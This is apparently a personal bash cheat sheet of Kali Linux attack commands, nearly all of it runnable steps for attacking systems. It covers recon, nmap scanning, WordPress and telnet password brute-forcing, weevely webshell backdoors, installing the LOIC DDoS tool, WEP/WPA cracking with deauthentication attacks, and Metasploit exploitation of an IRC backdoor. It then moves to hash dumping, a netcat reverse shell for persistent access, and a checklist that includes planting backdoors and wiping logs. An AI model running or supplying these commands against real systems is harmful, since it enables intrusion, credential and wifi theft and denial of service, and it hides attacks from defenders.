#!/bin/bash
exit

# SETTING UP KALI
#################

# See /EasyLinuxSetup/DebianDistros/appInstaller.sh for list of packages to install.
 


########################
# COMMANDS AND PROCESSES
########################

# Backup and replace default SSH keys
	cd /etc/ssh
	mkdir keys_backup_ssh
	mv ssh_host_* keys_backup_ssh
	dpkg-reconfigure openssh-server
	# Start ssh with `service ssh start`
	# Confirm ssh is running with `netstat -antp`

# Manage proxy settings
	leafpad /etc/proxychains.conf
	# Comment out "strict_chain" with a #
	# Uncomment "dynamic_chain" by removing the #
	# Make sure the socks5 proxy is active by adding "socks4 	127.0.0.1 9050" to the bottom of the file.

# Ensure system is not compromised with 
	chkrootkit


# RECON
#######
metagoofil help		# Extract metadata of public domains (documents from sites)
theharvester help	# Quickly find publically available data on a targeted person or website/IP
whois google.com	# Grab personal metadata on the registrant of a web domain
nslookup google.com	# Grab basic info (IP address) on a domain
fierce -h			# Find all associated domains/IPs based on a single domain
	fierce -dns google.com
dmitry -h			# Gathers as much info as possible on a host as fast as possible.
	dmitry -winsepfbo google.com
git clone https://github.com/leebaird/discover.git	# Quickly conduct passive recon on a company (automates many searches)
	./discover.sh
recon-ng			# Perform basic recon
	load infodb
	#if load `ipinfodb` & `run` doesn't work, you will need an API key from the recon-ng's website


# PORT MAPPING
##############
traceroute www.google.com	# Follow the path packets take to reach their destinations
nmap -v --tracerout 104.210.194.254	# Traceroute via nmap
hping3 -S www.pluralsight.com -p 80 -c 3 	# Send a ping-like command when standard ping is being blocked. This specific command checks port 80 for 3 attempts.
nmap -T4 -v -PN -n -sS --top-ports 100 --max-parallelism 10 -oA nmapSYN 104.210.194.254
	# -T4 = speed at which nmap executes. 1 is the slowest, 5 is the fastest
	# -v = verbose mode
	# -P = don't ping idventified active systems
	# -N = no resolusion should be made
	# -A = Enable aggressive options 
	# -sS = a send packet type of send
		# -sA = an alternative type that ckecks for ACKs and determines firewall rules
	# --top-ports 100 = ping the top 100 ports
	# --max-Parallelism = limit the max amount of outstanding probes
	# -oA = output results to the following filename (next argument) in all formats (normal, grep-able, xml)
	# IP may also be a domain name "www.google.com"
nmap -T5 -PN -v -A -oA nmapComplete 89.34.96.142	# A far more aggressive/thorough scan


# WEB PEN
#########
wafw00f www.google.com	# Detect WAFs (web application firewalls) on a named domain.
lbd www.google.com	# Determine if a domain uses either DNS or HTTP load balancing. Load balancers can explain strange behavior in various scripts/exploits
httrack "www.google.com" -O "/tmp/httrack" -v	# Mirror an entire website
sslscan www.google.com	# Query SSL services to determine it's details and cyphers. 
wpscan --url 129.168.1.1 --enumerate vp	# Scan Wordpress / CMS systems for known vulnerabilities and senumerate the system
	wpscan --url 129.168.1.1 --enumerate u	# Scan Wordpress / CMS systems for known vulnerabilities and senumerate the users
	wpscan --url 192.168.1.1 --wordlist /path/to/dictionary.txt --username admin	# Attempt to crack the 'admin' account using a predetermined list of words.
sqlmap -r /path/to/burpsuite/capture.txt --dbs	# When filing in a form with BurpSuite capturing it will create a map of the databases. Use sqlmap for a breakdown of all databases
	sqlmap -r /path/to/burpsuite/capture.txt -D my_database	# Show all tables within the "my_database" SQL database
weevely -h	# Maintains access via webshell to previously compromised websites - hold the backdoor open.
	weevely generate mypassword /root/Desktop/weevely.php	# Generates a backdoor PHP file, to be uploaded to target, with an access password of "mypassword" at the location of /root/Desktop ...
	weevely http://192.168.1.1/dvwa/hackable/weevely.php mypassword	# Opens a shell into the named URL access with the password from the PHP file generated earlier


# ETC
#####
# Install LOIC DDoS tool	- 	https://www.linuxsecrets.com/discussions/627-how-to-install-loic-in-kali-linux-low-orbit-ion-cannon
git clone https://github.com/NewEraCracker/LOIC
#cd LOIC/src/
#mdtool build
cd LOIC/
./loic.sh install
./loic.sh update
./loic.sh run


# INTERNAL NETWORK SCANNING
###########################
# Before opening OpenVAS for the first time you must use the "openvas initial setup" program. CLI name is `openvas-setup`
	# It will display a critical password THAT YOU MUST NOT LOOSE
		# Default username is "admin"
openvas-feed-update	# This will update ovas - should be done each use (even if slow)
# https://127.0.01:9392 & https://localhost:9392	These are the web portals to access ovas. They MUST have https:// in front. Web browser should throw warning...just add exception and continue forward.
# Don't use any 'easy setup wizard' type helpers to make your scans


# WEP ROUTER CRACKING / NETWORK SNIFFING
########################################
iwconfig	# Find your wifi adapter (we'll use wlan0 for example)
sudo airmon-ng start wlan0 # Where 'wlan0' would be any interface that can sniff
	# You will see the interface you've chosen is now suffixed by "mon"
sudo airodump-ng wlan0mon
	# Find the BSSID and CH (channel) for the targeted network. For example I'll use 00:01:02:03:04:05 and channel 11
	# The "PWR" column is negative. Numbers closer to 0 (positive) are stronger
sudo airodump-ng -c 11 --bssid 00:01:02:03:04:05 -w dump wlan0mon   # This begins the sniffing and saves all caps in current directory and prefixed with "dump"
	# -c 11	# Declare what channel to use
	# -w dump	# Prefix for the output files
	# wlan0mon	# Monitoring interface to use
	# White hats can fake authentication packets to give false positives to hackers:
		# aireplay-ng -1 0 -a 00:01:02:03:04:05 -h 09:08:07:06:05:04 -e "My Wifi Name" wlan0mon --ignore-negative-one
			# -1	# Signal a fake authentication
			# 0	# Reassociation timing (in seconds)
			# -a 00:01:02:03:04:05	# This is the router being hacked
			# -h 09:08:07:06:05:04	# This is any MAC address
			# --ignore-negative-one	# Ignore the -1 channel of wlan0mon
# The next 2 codes are more bruteforce-ish, can be swapped out for the "Replay Attack" section
sudo aircrack-ng -b 00:01:02:03:04:05 dump-01.cap   # Attempt cracking wifi using the named .cap file
sudo aircrack-ng -b 00:01:02:03:04:05 dump-01.cap -w wordlist.txt	# Once you have enough IVs in your .cap file this will compare the wifi keys against a given wordlist 

# REPLAY ATTACK (aka ARP Injection):
# Create traffic that appears to come from a trusted MAC address and route it to targed router (aka Replay Attack):
aireplay-ng -3 -b 00:01:02:03:04:05 -h 09:08:07:06:05:04 wlan0mon --ignore-negative-one
# Open a new terminal an run this to simulate legit traffic (must be run at same time)
aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:01:02:03:04:05 -h A1:B2:C3:D4:E5:F6 wlan0mon --ignore-negative-one
	# -2	# Use interactive Replay Attack
	# -p 0841	# Make packet appear as if it's sent from a wireless client (via frame control)
	# -c FF:FF...	# Send the packets to all the hosts on the network
	# -b 00:01:02:03:04:05	# The targeted router
	# -h A1:B2:C3:D4:E5:F6	# Your (the hacker)'s MAC address
# Wait for the "#Data," field to be >5000 (if WEP) in the airodump terminal
# After >5000 Data close all running terminals and run:
aircrack-ng -a 1 -b 00:01:02:03:04:05 -n 64 dump-01.cap
	# -a 1	# Force static WEP
	# dump-01.cap	# This is the file created during airodump, should be in directory were you ran the command in


# WpA/WPA2 ATTACKS (wifi router)
##################
iwconfig	# Find your wifi adapter (we'll use wlan0 for example)
service network-manager stop	# NM must be stopped first
sudo airmon-ng start wlan0 # Where 'wlan0' would be any interface that can sniff
sudo airodump-ng wlan0mon	# Copy the BSSID of target. Might not be necessary
sudo airodump-ng --bssid 00:01:02:03:04:05 -c 6 --showack -w wpa_log wlan0mon
	# --bssid is of targeted router
	# -c 6	# Channel router is on
	# --showack	# Ensure client computer acknowledges request from wifi point
	# -w wpa_log	# Write output to file with provided prefix
	# wlan0mon	# Your adapter in monitor mode
# Minimize (don't close) that terminal and open another to launch deauthentication attack. It kicks someone off the network so they have to re-enter (which is when you grab their key)
sudo aireplay-ng -0 20 -a 00:01:02:03:04:05 -c 09:08:07:06:05:04 wlan0mon
	# -0	# Indicates deauthentication attack
	# 20	# Send 20 deauthentication packets
	# -a	# Target router/access point bssid
	# -c	# Client's MAC address (found in the other terminal from the last command). Pick one to kick off the network
		# This isn't in the BSSID column, it's the "STATION" column
# If the deauth worked the top of the airodump terminal will briefly say "WPA handsake " followed by the target router's MAC
sudo aircrack-ng wpa_log-01.cap -w /path/to/wordlist.txt
	# wpa_log-01.cap	# The output file named in previous step but suffixed with the specific dump number
	# -w /path/to/wordlist.txt	# The dictionary to begin brute forcing with
# General cleanup/setting things back to normal
sudo airmon-ng stop wlan0mon
sudo service network-manager start


# GPU BASED HASH/KEY CRACKING
#############################
# Pairs well with WEP/WPA/WPA2 hacking
lspci | grep -i "VGA"	# Check your GPU type
sudo apt-get install p7zip-full -y	# Install 7zip to extract GPU crackers
wpaclean clean.cap /path/to/wpa_log-01.cap	# Clean the airodump cap for use with AMD Hashcat
sudo aircrack-ng clean.cap -J outfile	# Generate a Hashcat compatible file
	# clean.cap	# Created during wpaclean step
	# outfile	# The file to be created during generation (will be suffixed with ".hccap"
hashcat -m 2500 outfile.hccap /path/to/wordlist.txt --force
	# -m 2500	# Signifies WPA attacks
	# outfile.hccap	# The file generated in previous step
	# Password should be found in the output of the command


# PACKET INJECTION
##################
sudo aireplay-ng -9 wlan0	# Test if your device supports packet injection. "-9" is the test flag and is aka "--test" and "wlan0" is your wifi card.
sudo wash -i wlan1mon	# Check if the target is using WPC - it not then it will not appear in list
sudo aireplay-ng --fakeaut 0 -e "My Wifi name" -a 00:01:02:03:04:05 wlan1mon	# Begin injecting fake packets to router. If your device (wlan1mon) is not on the same channel as the router use `sudo iwconfig wlan1mon channel 1` where "1" would be the number of your router's channel.


# BYPASSING HIDDEN WIFI / ESSID
###############################
# During the airmon-ng stage watch for networks that don't have a name but, instead, airmon specifies a "length". The "length" is not an accurate representation of password lengt.
	# Example: <length:   9>


# SYN SCAN DETECTION
####################

# A hacker will run:
	ifconfig	# Identify the "inet addr:". For example we'll use 10.0.0.222
	nmap 10.0.0.101 -v	# Scan the IP host at the .101 address (it should be there)
# The whitehat then reviews the Wireshark logs
	# Choose "Statistics > Conversations" from menu bar
	# On the "IPv4" tab you'll find the conversation between the hacker on .222 and the host on .101 with a large number of packets in the "Packets" column
	# The "TCP:" tab will show numerous packets being sent between .222 and .101
	# You can select an entry and click "Follow Streams" button. Disregard popup window and minimize the "Conversations" window you were in, returning to main Wireshark window
	# This will show who sent what and further details
		# If there are conversations after the "RST" packet is sent it may be suspicious
# If numerous SYN packets are comming from the same MAC address / IP in a very short timeframe (miliseconds-ish) you're probably getting DoS/DDoS attacked
	# But not always...


# EXPLOITING VIA METASPLOIT
###########################
sudo service postgresql start	# Required dependency
msfconsole	# Open Metasploit cli
	# Use "?" for a help menu of commands
	workspace	# This command, when run alone, shows all available workspaces
	workspace -a MyWorkspace
		# -a	# Adds a new workspace by the name "MyWorkspace" in this example
	workspace MyWorkspace	# Switch to new workspace
	search ircd	# Searches for the "ircd" exploit and displays basic data
		# Copy the exploit name for use in further commands. Will look something like this:
			#exploit/unix/irc/unreal_ircd_3281_backdoor
	info exploit/unix/irc/unreal_ircd_3281_backdoor
		# Provides info on a specific exploit
	use exploit/unix/irc/unreal_ircd_3281_backdoor	# Instructe Metasploit to attack with a particular exploit
		# Sub terminal may change again, indicating use of the named exploit
		show options	# Show parameters that may be passed into the exploit
			# This will show a series of option "NAMES". Use the below command, swapping out the names, to declare them.
		set RHOSTS 192.168.0.108
		show options	# When entered after using the `set` command you should see your entries in the "CURRENT SETTINGS" column
		show payloads	# List all suitable payloads for this exploit
		set payload cmd/unix/reverse	# Declare which payload you wish to deliver.
			# "cmd/unix/reverse" was selected from the output of `show payloads`. This is a popular selection for opening shells on *nix devices
		show options	# Show the options for the payload (different than from the full exploit)
			# RHOST = "remote host"
			# LHOST = "local host"
		# In a new terminal run:
			ifconfig	# to determine your local IP address.
		set LHOST 192.168.0.109	# This should be you (the hacker's) local IP
		exploit	# Run exploit with all configs provided
			# The output for [the example exploit] should say something like "Command shell session 1 opened ..."
			whoami	# Check if you're in the shell
			pwd	# Check where you are in the victim's device


# POST EXPLOIT
##############
# 1.	Quickly assess environment. What other apps are vulnerable? Any other ways in? Etc.
# 2.	Locate and copy/modify critical files (passwords, credentials, upload backdoors, etc.)
# 3.	Create new user accounts & anything needed to keep options open
# 4.	Vertical escalation- capture admin or system-level credentials
# 5.	Attack other systems. aka Horizontal escalation
# 5.	Install backdoors & covert channels to keep privileges
# 6.	Clean up after the attack (hide your trail). 
			# Clean or flood logs 
			# Check running defences for alerts

# Use [Ctrl + Z] to put the root shell in the background and return to your device.
sessions	# Display the session ID of the opened root sheel (will need for later)
use post/linux/gather/hashdump
show options
set SESSION 1	# Set to the session number found in the `sessions` step
exploit
	# Copy the output from this command to a local text file
use post/linux/gather/checkvm	# Determine if victim machine is VM or on hardware
show options
set SESSION 1	# Set to the session number found in the `sessions` step
exploit
	# Remember the output. It should specify if VM and what type.
use post/linux/gather/enum_configs	# Hunt down critical configuration files on the victim system
show options
set SESSION 1	# Set to the session number found in the `sessions` step
exploit
	# This exploit should automatically save the data to your system (no need to save)
	# The output lists files saved to your PC. Open them at will to read contents
use post/linux/gather/enum_network	# Grab the network configs
set SESSION 1	# Set to the session number found in the `sessions` step
exploit
	# Same sort of output as in last step
use post/linux/gather/enum_protections	# Find out what types of defences the target system has
set SESSION 1
exploit
use post/linux/gather/enum_system	# Grab data on users, installed packages, services, hardware, etc.
set SESSION 1
exploit
use post/linux/gather/enum_users_history	# Grab all user history
set SESSION 1
exploit


# ENSURE PERSISTENT CONNECTION
##############################
# BASED ON THE EXPLOITING VIA METASPLOIT AND POST EXPLOIT SECTIONS!!!!
# Return to the target's root shell session
nc -h	# Run the help option for the Netcat program to see if it's installed on the target
	# This is used to bypass the firewall as the target will be connecting to you...not you connecting to the target.
# ON ATTACKER MACHINE:
	nc -lvp 4444	# Begin a "listener"
		# -l	# Listen for an incoming connection rather than initiate a connection to a remote host
		# -v	# Verbose output
		# -p	# Source Port (4444 in this case)
# BACK ON VICTIM MACHINE:
	nc -vn 192.168.0.109 4444 -e /bin/bash
		# -v	# Verbose output
		# -n	# Do not do any DNS or service lookups
		# 192.168.0.109	# IP address of the attacking machine
		# 4444	# Port number specified in the listener (on the attacker's PC)
		# -e	# Specify the file name to execute after connection is made (/bin/bash will open the shell)
# The attackers terminal should now have a permanent connection with the target




# BRUTE FORCE ATTACKING (telnet targets)
#######################
hydra -v -V -l username -P /path/to/wordlist.txt -t 8 10.0.0.101 telnet
	# "-l username" is the login command folowed by target's username
	# "-P ..wordlist.txt" is path to the passwords to attempt logging in with
	# "-t 8" specify the number of max parallel connections (bigger = faster)
	# "10.0.0.101" fake victim for example
	# "telnet" the protocol to brute force on
	# The output will list if the password  was found
telnet	# This will open a telnet sub-terminal
	10.0.0.101
	# Enter login details from above step
# The attempts to brute force will appear in a Wireshark if admins were monitoring during the hack

























